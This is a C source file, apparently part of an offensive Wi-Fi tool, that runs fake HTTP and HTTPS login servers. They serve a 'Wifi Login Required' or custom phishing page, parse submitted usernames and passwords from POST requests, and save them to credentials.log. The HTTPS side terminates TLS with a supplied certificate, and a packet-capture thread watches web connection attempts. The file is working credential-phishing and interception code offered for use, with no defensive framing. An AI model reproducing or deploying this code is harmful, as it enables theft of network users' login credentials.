
#include "../include/http_intercept.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <pcap.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define HTTP_PORT 80
#define HTTPS_PORT 443
#define MAX_PACKET_SIZE 65536
#define MAX_CLIENTS 50
#define DEFAULT_PAGE "<html><head><title>Login Required</title></head><body><h1>Wifi Login Required</h1><form method=\"post\"><label>Username:</label><input type=\"text\" name=\"username\"><br><label>Password:</label><input type=\"password\" name=\"password\"><br><input type=\"submit\" value=\"Login\"></form></body></html>"

typedef struct {
    int client_sock;
    struct sockaddr_in client_addr;
    SSL *ssl;
} client_info_t;

static pthread_t http_thread;
static pthread_t https_thread;
static pthread_t redirection_thread;
static int http_socket = -1;
static int https_socket = -1;
static bool http_running = false;
static char *phishing_page = NULL;
static char *cert_file = NULL;
static char *key_file = NULL;
static SSL_CTX *ssl_ctx = NULL;

static void *handle_http_client(void *arg) {
    client_info_t *client = (client_info_t *)arg;
    char buffer[MAX_PACKET_SIZE];
    int bytes_read;
    
    bytes_read = recv(client->client_sock, buffer, sizeof(buffer) - 1, 0);
    if (bytes_read <= 0) {
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    buffer[bytes_read] = '\0';
    
    char *response;
    char content_length[32];
    char *page = phishing_page ? phishing_page : (char *)DEFAULT_PAGE;
    
    sprintf(content_length, "%lu", strlen(page));
    
    response = malloc(strlen(page) + 256);
    if (response == NULL) {
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    sprintf(response, 
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: %s\r\n"
            "Connection: close\r\n\r\n%s",
            content_length, page);
    
    send(client->client_sock, response, strlen(response), 0);
    
    if (strstr(buffer, "POST") && strstr(buffer, "username=") && strstr(buffer, "password=")) {
        char *credentials = strstr(buffer, "username=");
        char *amp = credentials;
        while ((amp = strchr(amp, '&')) != NULL) {
            *amp = '\n';
        }
        
        FILE *log = fopen("credentials.log", "a");
        if (log) {
            fprintf(log, "--- New credentials ---\n%s\n\n", credentials);
            fclose(log);
            printf("[+] Credentials captured and saved to credentials.log\n");
        }
    }
    
    free(response);
    close(client->client_sock);
    free(client);
    return NULL;
}

static void *handle_https_client(void *arg) {
    client_info_t *client = (client_info_t *)arg;
    char buffer[MAX_PACKET_SIZE];
    int bytes_read;
    
    if (ssl_ctx == NULL) {
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    SSL *ssl = SSL_new(ssl_ctx);
    if (ssl == NULL) {
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    SSL_set_fd(ssl, client->client_sock);
    
    if (SSL_accept(ssl) <= 0) {
        SSL_free(ssl);
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    bytes_read = SSL_read(ssl, buffer, sizeof(buffer) - 1);
    if (bytes_read <= 0) {
        SSL_free(ssl);
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    buffer[bytes_read] = '\0';
    
    char *response;
    char content_length[32];
    char *page = phishing_page ? phishing_page : (char *)DEFAULT_PAGE;
    
    sprintf(content_length, "%lu", strlen(page));
    
    response = malloc(strlen(page) + 256);
    if (response == NULL) {
        SSL_free(ssl);
        close(client->client_sock);
        free(client);
        return NULL;
    }
    
    sprintf(response, 
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: %s\r\n"
            "Connection: close\r\n\r\n%s",
            content_length, page);
    
    SSL_write(ssl, response, strlen(response));
    
    if (strstr(buffer, "POST") && strstr(buffer, "username=") && strstr(buffer, "password=")) {
        char *credentials = strstr(buffer, "username=");
        char *amp = credentials;
        while ((amp = strchr(amp, '&')) != NULL) {
            *amp = '\n';
        }
        
        FILE *log = fopen("credentials.log", "a");
        if (log) {
            fprintf(log, "--- New credentials ---\n%s\n\n", credentials);
            fclose(log);
            printf("[+] Credentials captured and saved to credentials.log\n");
        }
    }
    
    free(response);
    SSL_free(ssl);
    close(client->client_sock);
    free(client);
    return NULL;
}

static void *redirection_thread_func(void *arg) {
    pcap_t *handle;
    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    
    handle = pcap_open_live("any", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "[-] Failed to open packet capture device: %s\n", errbuf);
        return NULL;
    }
    
    char filter_exp[] = "tcp[tcpflags] & tcp-syn != 0 and (tcp dst port 80 or tcp dst port 443) and tcp[tcpflags] & tcp-ack == 0";
    
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "[-] Failed to compile filter: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return NULL;
    }
    
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "[-] Failed to set filter: %s\n", pcap_geterr(handle));
        pcap_freecode(&fp);
        pcap_close(handle);
        return NULL;
    }
    
    pcap_freecode(&fp);
    
    printf("[+] HTTP/HTTPS redirection started\n");
    
    pcap_loop(handle, -1, NULL, NULL);
    
    pcap_close(handle);
    return NULL;
}

static void *http_server_thread(void *arg) {
    printf("[+] HTTP server started on port %d\n", HTTP_PORT);
    
    while (http_running) {
        struct sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);
        int client_sock = accept(http_socket, (struct sockaddr *)&client_addr, &client_addr_len);
        
        if (client_sock < 0) {
            if (http_running) {
                perror("[-] accept() failed");
            }
            continue;
        }
        
        client_info_t *client = malloc(sizeof(client_info_t));
        if (client == NULL) {
            close(client_sock);
            continue;
        }
        
        client->client_sock = client_sock;
        client->client_addr = client_addr;
        
        pthread_t client_thread;
        if (pthread_create(&client_thread, NULL, handle_http_client, client) != 0) {
            perror("[-] Failed to create client thread");
            free(client);
            close(client_sock);
            continue;
        }
        
        pthread_detach(client_thread);
    }
    
    printf("[+] HTTP server stopped\n");
    return NULL;
}

static void *https_server_thread(void *arg) {
    printf("[+] HTTPS server started on port %d\n", HTTPS_PORT);
    
    while (http_running) {
        struct sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);
        int client_sock = accept(https_socket, (struct sockaddr *)&client_addr, &client_addr_len);
        
        if (client_sock < 0) {
            if (http_running) {
                perror("[-] accept() failed");
            }
            continue;
        }
        
        client_info_t *client = malloc(sizeof(client_info_t));
        if (client == NULL) {
            close(client_sock);
            continue;
        }
        
        client->client_sock = client_sock;
        client->client_addr = client_addr;
        
        pthread_t client_thread;
        if (pthread_create(&client_thread, NULL, handle_https_client, client) != 0) {
            perror("[-] Failed to create client thread");
            free(client);
            close(client_sock);
            continue;
        }
        
        pthread_detach(client_thread);
    }
    
    printf("[+] HTTPS server stopped\n");
    return NULL;
}

static void init_openssl(void) {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
}

static void cleanup_openssl(void) {
    EVP_cleanup();
    ERR_free_strings();
}

static SSL_CTX *create_ssl_context(void) {
    SSL_CTX *ctx = SSL_CTX_new(SSLv23_server_method());
    if (ctx == NULL) {
        ERR_print_errors_fp(stderr);
        return NULL;
    }
    
    SSL_CTX_set_ecdh_auto(ctx, 1);
    
    if (cert_file != NULL && key_file != NULL) {
        if (SSL_CTX_use_certificate_file(ctx, cert_file, SSL_FILETYPE_PEM) <= 0) {
            ERR_print_errors_fp(stderr);
            SSL_CTX_free(ctx);
            return NULL;
        }
        
        if (SSL_CTX_use_PrivateKey_file(ctx, key_file, SSL_FILETYPE_PEM) <= 0) {
            ERR_print_errors_fp(stderr);
            SSL_CTX_free(ctx);
            return NULL;
        }
    } else {
        fprintf(stderr, "[-] No SSL certificate provided, HTTPS interception disabled\n");
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    return ctx;
}

bool start_http_intercept(void) {
    if (http_running) {
        return true;
    }
    
    init_openssl();
    
    http_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (http_socket < 0) {
        perror("[-] Failed to create HTTP socket");
        return false;
    }
    
    int opt = 1;
    if (setsockopt(http_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[-] Failed to set SO_REUSEADDR for HTTP socket");
        close(http_socket);
        return false;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(http_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[-] Failed to bind HTTP socket");
        close(http_socket);
        return false;
    }
    
    if (listen(http_socket, MAX_CLIENTS) < 0) {
        perror("[-] Failed to listen on HTTP socket");
        close(http_socket);
        return false;
    }
    
    https_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (https_socket < 0) {
        perror("[-] Failed to create HTTPS socket");
        close(http_socket);
        return false;
    }
    
    if (setsockopt(https_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[-] Failed to set SO_REUSEADDR for HTTPS socket");
        close(http_socket);
        close(https_socket);
        return false;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTPS_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(https_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[-] Failed to bind HTTPS socket");
        close(http_socket);
        close(https_socket);
        return false;
    }
    
    if (listen(https_socket, MAX_CLIENTS) < 0) {
        perror("[-] Failed to listen on HTTPS socket");
        close(http_socket);
        close(https_socket);
        return false;
    }
    
    if (cert_file != NULL && key_file != NULL) {
        ssl_ctx = create_ssl_context();
    }
    
    http_running = true;
    
    if (pthread_create(&http_thread, NULL, http_server_thread, NULL) != 0) {
        perror("[-] Failed to create HTTP server thread");
        close(http_socket);
        close(https_socket);
        if (ssl_ctx != NULL) {
            SSL_CTX_free(ssl_ctx);
            ssl_ctx = NULL;
        }
        http_running = false;
        return false;
    }
    
    if (ssl_ctx != NULL) {
        if (pthread_create(&https_thread, NULL, https_server_thread, NULL) != 0) {
            perror("[-] Failed to create HTTPS server thread");
        }
    }
    
    if (pthread_create(&redirection_thread, NULL, redirection_thread_func, NULL) != 0) {
        perror("[-] Failed to create redirection thread");
    }
    
    return true;
}

bool set_phishing_page(const char *path) {
    FILE *file = fopen(path, "rb");
    if (file == NULL) {
        perror("[-] Failed to open phishing page file");
        return false;
    }
    
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    char *content = malloc(file_size + 1);
    if (content == NULL) {
        perror("[-] Failed to allocate memory for phishing page");
        fclose(file);
        return false;
    }
    
    size_t read_size = fread(content, 1, file_size, file);
    fclose(file);
    
    if (read_size != file_size) {
        perror("[-] Failed to read phishing page file");
        free(content);
        return false;
    }
    
    content[file_size] = '\0';
    
    if (phishing_page != NULL) {
        free(phishing_page);
    }
    
    phishing_page = content;
    
    printf("[+] Phishing page loaded from %s\n", path);
    return true;
}

bool set_ssl_certificate(const char *cert_path, const char *key_path) {

    if (access(cert_path, F_OK) != 0 || access(key_path, F_OK) != 0) {
        fprintf(stderr, "[-] Certificate or key file not found\n");
        return false;
    }
    
    if (cert_file != NULL) {
        free(cert_file);
    }
    if (key_file != NULL) {
        free(key_file);
    }
    
    cert_file = strdup(cert_path);
    key_file = strdup(key_path);
    
    if (cert_file == NULL || key_file == NULL) {
        perror("[-] Failed to allocate memory for certificate paths");
        if (cert_file != NULL) {
            free(cert_file);
            cert_file = NULL;
        }
        if (key_file != NULL) {
            free(key_file);
            key_file = NULL;
        }
        return false;
    }
    
    if (http_running && ssl_ctx != NULL) {
        SSL_CTX_free(ssl_ctx);
        ssl_ctx = create_ssl_context();
    }
    
    printf("[+] SSL certificate set to %s / %s\n", cert_path, key_path);
    return true;
}

void stop_http_intercept(void) {
    if (http_running) {
        http_running = false;
        
        if (http_socket != -1) {
            close(http_socket);
            http_socket = -1;
        }
        if (https_socket != -1) {
            close(https_socket);
            https_socket = -1;
        }
        
        pthread_join(http_thread, NULL);
        if (ssl_ctx != NULL) {
            pthread_join(https_thread, NULL);
        }
        pthread_join(redirection_thread, NULL);
        
        if (ssl_ctx != NULL) {
            SSL_CTX_free(ssl_ctx);
            ssl_ctx = NULL;
        }
        
        cleanup_openssl();
        
        if (phishing_page != NULL) {
            free(phishing_page);
            phishing_page = NULL;
        }
        if (cert_file != NULL) {
            free(cert_file);
            cert_file = NULL;
        }
        if (key_file != NULL) {
            free(key_file);
            key_file = NULL;
        }
    }
}